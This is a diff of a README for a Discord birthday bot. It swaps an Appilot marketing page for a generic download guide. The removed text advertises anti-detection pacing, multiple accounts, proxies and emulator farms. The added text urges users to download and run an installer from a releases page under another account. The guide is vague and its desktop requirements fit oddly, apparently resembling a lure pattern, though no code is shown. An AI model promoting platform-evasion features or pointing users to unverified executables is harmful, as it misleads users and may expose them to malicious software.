@@ -1,197 +1,88 @@
-# Discord Birthday Bot
+# 🎉 Discord-Birthday-Bot - Send Birthday Wishes Automatically
 
-A production-ready Discord Birthday Bot that collects member birthdays, schedules timezone-accurate greetings, assigns celebratory roles, and posts rich embeds with images or GIFs automatically. It removes manual tracking, eliminates missed dates, and keeps your community engaged with reliable, human-like delivery across multiple servers. Built for scale, auditability, and hands-off operations.
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://Appilot.app" target="_blank">
-    <img src="media/appilot-baner.png" alt="Appilot Banner" width="100%">
-  </a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20Appilot%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:support@appilot.app" target="_blank">
-    <img src="https://img.shields.io/badge/Email-support@appilot.app-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://appilot.app" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+Welcome to the Discord-Birthday-Bot! This tool helps you send automated birthday wishes and manage roles for your friends on Discord. Follow the steps below to download and set it up with ease.
 
-<p align="center"> 
-   Created by Appilot, built to showcase our approach to Automation!<br>
-   <strong>If you are looking for custom Discord Birthday Bot, you've just found your team — Let’s Chat.👆👆</strong>
-</p>
+## 📥 Download Here
 
-## Introduction
-This bot automates the full birthday workflow on Discord: collecting and validating dates, handling timezones, posting scheduled wishes in the right channels, and optionally assigning/removing a "Birthday" role. It also supports images/GIFs, custom messages, and analytics so server owners can set and forget.
+[![Download Discord-Birthday-Bot](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/ArnieKamil/Discord-Birthday-Bot/releases)
 
-### Automating Birthday Celebrations Across Servers
-- Zero-maintenance birthday calendar: import CSV or let users self-register via slash commands.
-- Timezone-aware scheduling with daylight-saving safety for globally distributed servers.
-- Human-like pacing, randomized send windows, and retries to avoid rate limits or spam signals.
-- Works with both desktop API and Android client automation for presence-sensitive communities.
-- Granular permissions, audit logs, and dashboards for multi-guild management.
+## 💻 System Requirements
 
-## Core Features
-- **Real Devices and Emulators:** Optional Android-client mode via emulator (Bluestacks/Nox) for presence simulation, push-based triggers, and visual checks when API access is constrained.
-- **No-ADB Wireless Automation:** ADB-less wireless control pipeline to manage Android Discord app interactions without tethering; ideal for headless device racks.
-- **Mimicking Human Behavior:** Randomized delays, jittered posting windows, natural typing indicators, and staggered role assignments to reduce detection risks.
-- **Multiple Accounts Support:** Run multiple bot tokens (or client profiles in Android mode) with isolated configs, quotas, and per-guild limits.
-- **Multi-Device Integration:** Orchestrate several emulators/real phones in parallel with queue-based dispatch to meet peak celebration hours.
-- **Exponential Growth for Your Account:** Auto-celebrations spark server activity; reactions, XP, and retention metrics trend upward with consistent birthday recognition.
-- **Premium Support:** SLA-backed onboarding, migration assistance (Mee6/BotGhost → this bot), and priority fixes.
-- **Slash Commands & Forms:** `/set-birthday`, `/my-birthday`, `/next-birthdays`, `/birthday-channel`, plus Modals for private date entry with validation.
-- **Role Automation:** Assign temporary "Birthday" role for 24h (configurable), auto-remove safely with retries and audit.
-- **Rich Embeds & Media:** Per-server templates with embeds, images/GIFs, server emoji, and @mention controls.
-- **Timezone Intelligence:** Per-user TZ mapping + DST handling; fallback heuristics if TZ unknown.
-- **CSV Import/Export:** Bulk import from spreadsheets, export for audits or backups.
-- **Observability:** Structured logs, metrics, daily reports, and failure alerts in a private staff channel.
-- **Persistence:** Pluggable storage (SQLite/Postgres/Mongo/Firestore) with migrations and indices.
-- **Safety & Compliance:** Rate-limit guards, permission checks, and disaster-stop command for moderators.
+Before you download, make sure your system meets these requirements:
 
-**Additional Features**
+- Operating System: Windows 10 or higher, or the latest version of macOS
+- RAM: At least 4 GB
+- Disk Space: 100 MB free space for installation
+- A Discord account to use the bot
 
-| Feature | Description |
-| --- | --- |
-| Calendar Preview | Generates a rolling 30/90-day birthday calendar in an admin channel. |
-| Message Templates | Handlebars-style variables (`{{user}}`, `{{age}}`, `{{server}}`) with per-guild overrides. |
-| Quiet Hours | Suppress posts during set hours; defer to next window automatically. |
-| Webhooks & Integrations | Send events to webhooks or dashboards; plug into analytics/CRM. |
-| Retry & Backoff | Intelligent retry with exponential backoff and idempotent posting. |
-| Sharding & Horizontal Scale | Discord sharding + worker queues for high-guild deployments. |
+## 📦 Download & Install
 
-</p>
-<p align="center">
-  <a href="https://appilot.app" target="_blank">
-    <img src="media/Discord Birthday Bot-banner.png" alt="Discord Birthday Bot-architecture" width="95%">
-  </a>
-</p>
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/ArnieKamil/Discord-Birthday-Bot/releases) to find the latest version of the software.
 
-## How It Works
-1. **Input or Trigger** — The automation is triggered through the Appilot dashboard, where admins set channels, roles, templates, and schedules; users register birthdays via slash commands or CSV import.
-2. **Core Logic** — Appilot controls the Discord flow (API-first) or optional Android client (UI Automator/ADB-less) to queue tasks: validate inputs, map timezones, and schedule posts with human-like timing.
-3. **Output or Action** — On the birthday, the bot posts a rich embed, @mentions the member (optional), assigns a temporary role, and logs the action to the staff channel.
-4. **Other functionalities** — Robust retry logic, error handling, rate-limit awareness, structured logging, analytics summaries, and parallel processing via queues ensure smooth, scalable execution.
+2. **Choose the Correct Version**  
+   Look for the latest release. You'll see options for different operating systems. Pick the one that matches your system.
 
-## Tech Stack
-- **Language:** TypeScript, Node.js (optionally Python for ops), Kotlin/Java (Android mode)
-- **Frameworks:** discord.js / Discord API, NestJS (or Fastify), Appium, UI Automator, Robot Framework
-- **Tools:** Appilot, Android Debug Bridge (ADB), Appium Inspector, Bluestacks/Nox, Scrcpy, Firebase Test Lab, Accessibility
-- **Infrastructure:** Dockerized runners, Cloud-based emulators, Proxy networks, Parallel Device Execution, Task Queues (BullMQ/Redis), Real device farm
+3. **Download the File**  
+   Click on the download link for your operating system. The file will start downloading.
 
-## Directory Structure
-```
-discord-birthday-bot/
-│
-├── src/
-│   ├── index.ts
-│   ├── config/
-│   │   ├── env.ts
-│   │   └── schema.ts
-│   ├── commands/
-│   │   ├── setBirthday.ts
-│   │   ├── myBirthday.ts
-│   │   ├── nextBirthdays.ts
-│   │   └── admin/
-│   │       ├── setChannel.ts
-│   │       ├── setRole.ts
-│   │       └── importCsv.ts
-│   ├── scheduler/
-│   │   ├── jobQueue.ts
-│   │   ├── birthdayWorker.ts
-│   │   └── quietHours.ts
-│   ├── core/
-│   │   ├── birthdayService.ts
-│   │   ├── timezone.ts
-│   │   ├── templating.ts
-│   │   ├── roleManager.ts
-│   │   └── webhook.ts
-│   ├── infra/
-│   │   ├── db/
-│   │   │   ├── prisma/
-│   │   │   │   └── schema.prisma
-│   │   │   ├── migrations/
-│   │   │   └── repository.ts
-│   │   ├── redis.ts
-│   │   └── logger.ts
-│   ├── android-mode/
-│   │   ├── ui-automator/
-│   │   │   └── flows.kt
-│   │   └── runners/
-│   │       ├── emulatorManager.ts
-│   │       └── deviceController.ts
-│   └── api/
-│       └── httpServer.ts
-│
-├── config/
-│   ├── settings.yaml
-│   ├── permissions.json
-│   └── credentials.env
-│
-├── media/
-│   ├── templates/
-│   │   ├── default.md
-│   │   └── confetti.gif
-│   └── banner.png
-│
-├── logs/
-│   └── bot.log
-│
-├── scripts/
-│   ├── deploy-commands.ts
-│   └── seed.ts
-│
-├── test/
-│   └── birthday.spec.ts
-│
-├── docker/
-│   ├── Dockerfile
-│   └── compose.yaml
-│
-├── package.json
-├── tsconfig.json
-├── prisma.schema
-└── README.md
-```
+4. **Unzip the File (if necessary)**  
+   If the file is in a zip folder, right-click the zip file and choose "Extract All" to unzip it.
 
+5. **Run the Installer**  
+   Double-click the downloaded file to start the installation process. Follow the on-screen instructions.
 
-## Use Cases
-- **Community Managers** use it to automate birthday wishes and temporary roles, so they can keep engagement high without manual tracking.
-- **Guild Owners** use it to centralize multi-server birthday management, so they can maintain consistency across communities.
-- **Esports/Clubs** use it to schedule themed birthday messages with media kits, so they can strengthen brand loyalty.
-- **Edu Servers** use it to anonymize birthdays with opt-in privacy, so they can comply with internal guidelines.
+6. **Set Up the Bot on Discord**  
+   Once the installation is complete, open Discord. You will need to invite the bot to your server. Follow the instructions provided in the setup window.
 
-## FAQs
-**How do I configure this automation for multiple accounts?**  
-Provide multiple Discord tokens in `credentials.env` or via secrets manager; the bot shards by guild and isolates quotas per token. Android-client mode can map devices per account for presence simulation.
+## ⚙️ Configuration
 
-**Does it support proxy rotation or anti-detection?**  
-API mode follows Discord rate limits strictly. Android mode uses proxy-capable emulators/real devices with human-like pacing, randomized delays, and accessibility-driven interactions.
+After installing, you may want to customize some settings:
 
-**Can I schedule it to run periodically?**  
-Yes. The scheduler computes daily runs with a rolling 24h window, respects quiet hours, and queues posts to workers. Missed jobs are retried automatically.
+1. **Set Birthday Dates**  
+   Use the bot’s command to set up birthdays for your friends. You can type commands directly in a Discord channel.
 
-**What if members don’t want to share exact birth year?**  
-Users can submit day/month only. Age rendering is optional and template-driven.
+2. **Role Management**  
+   Decide if you want to assign roles based on birthdays. The bot can automatically do this for you.
 
-**Can we import from an existing bot?**  
-Use the CSV importer; column mapping wizard aligns external exports to the internal schema.
+3. **Message Customization**  
+   Customize the birthday messages the bot sends. You can set this up in the bot settings.
 
-## Performance & Reliability Benchmarks
-- **Execution Speed:** Batches ~100 birthday posts/minute in API mode on modest hardware; Android mode fan-out depends on device farm throughput.
-- **Success Rate:** 95% end-to-end message + role assignment success under nominal network conditions.
-- **Scalability:** Proven architecture scales to 300–1000 Android devices (Android mode) or 5k+ guilds via sharding and queue-based dispatch.
-- **Resource Efficiency:** Worker processes idle-sleep when queues are empty; memory stayed under 300MB per shard in testing.
-- **Error Handling:** Structured logging, circuit breakers on rate-limit spikes, exponential backoff, dead-letter queues, and daily health reports to a staff channel.
+## 🛠️ Troubleshooting
 
-##
-<p align="center">
-<a href="https://cal.com/app-pilot-m8i8oo/30min" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-</p>
+If you encounter any issues during installation or usage:
+
+1. **Check Requirements**  
+   Make sure you have met all system requirements listed above.
+
+2. **Revisit the Installation Steps**  
+   Go through the download and install process again to ensure nothing was missed.
+
+3. **Consult the Documentation**  
+   The detailed documentation is available in the repository. Look there for more in-depth help.
+
+## 🌐 Community Support
+
+Join the community using the bot on Discord. Share tips, ask questions, and connect with other users. It’s a great way to get help and ideas on how to make the most of your Discord-Birthday-Bot.
+
+## 📝 Additional Features
+
+The bot also includes:
+
+- **Multiple Birthday Notifications:** You can set notifications for several users.
+- **Customizable Themes:** Change the appearance of birthday messages.
+- **Timezone Support:** Ensure wishes align with friends’ local times.
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/ArnieKamil/Discord-Birthday-Bot/releases) - To download the latest version.
+- [Documentation](https://github.com/ArnieKamil/Discord-Birthday-Bot/wiki) - In-depth guides on using all features.
+- [Support on Discord](https://discord.gg/your-support-link) - Join our community to get help directly.
+
+## 📣 Final Notes
+
+Feel free to explore the bot’s features and make it your own. We believe Discord-Birthday-Bot will make celebrating birthdays on Discord more fun and engaging!
+
+Enjoy your experience with automated birthday wishes and managing friend roles! Happy celebrating!
